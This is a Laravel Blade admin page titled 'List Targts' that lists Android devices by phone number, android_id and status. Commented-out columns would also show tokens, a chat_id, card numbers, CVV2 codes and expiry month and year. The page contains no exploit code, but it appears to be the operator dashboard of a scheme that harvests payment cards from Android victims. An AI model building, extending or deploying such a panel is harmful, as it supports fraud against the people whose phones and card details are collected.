@extends('layout.layout')

@section('title', "List Targts")

@section('link')
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"/>
    <link href="https://cdn.datatables.net/1.10.21/css/jquery.dataTables.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.10.21/css/dataTables.bootstrap4.min.css" rel="stylesheet">
@endsection
@section('content')

<div class="container mt-5">
    <br/>
    <h2 class="mb-4">device list ({{$count}})</h2>
    <table class="table table-bordered yajra-datatable">
        <thead>
            <tr>
                <th>id</th>
                <th>Phone</th>
                <th>android_id</th>
                <th>status</th>
                <!-- <th>token</th> -->
                <!-- <th>chat_id</th> -->
                <!-- <th>card</th> -->
                <!-- <th>cvv2</th> -->
                <!-- <th>month</th> -->
                <!-- <th>year</th> -->
                <th>created_at</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>
</div>
   
</body>
<script  src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js"></script>  
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js"></script>
<script src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
<script src="https://cdn.datatables.net/1.10.21/js/dataTables.bootstrap4.min.js"></script>
<script type="text/javascript">
  $(function () {
    
    var table = $('.yajra-datatable').DataTable({
        processing: true,
        serverSide: true,
        ajax: "{{ route('devices.create') }}",
        columns: [
            {data: 'DT_RowIndex', name: 'DT_RowIndex'},
            {data: 'phone', name: 'phone'},
            {data: 'android_id', name: 'android_id'},
            {data: 'status', name: 'status'},
            // {data: 'token', name: 'token'},
            // {data: 'chat_id', name: 'chat_id'},
            // {data: 'card', name: 'card'},
            // {data: 'cvv2', name: 'cvv2'},
            // {data: 'month', name: 'month'},
            // {data: 'year', name: 'year'},
            {data: 'created_at', name: 'created_at'},
                
            {
                data: 'action', 
                name: 'action', 
                orderable: true, 
                searchable: true
            },
        ]
    });
    
  });
</script>
</html>
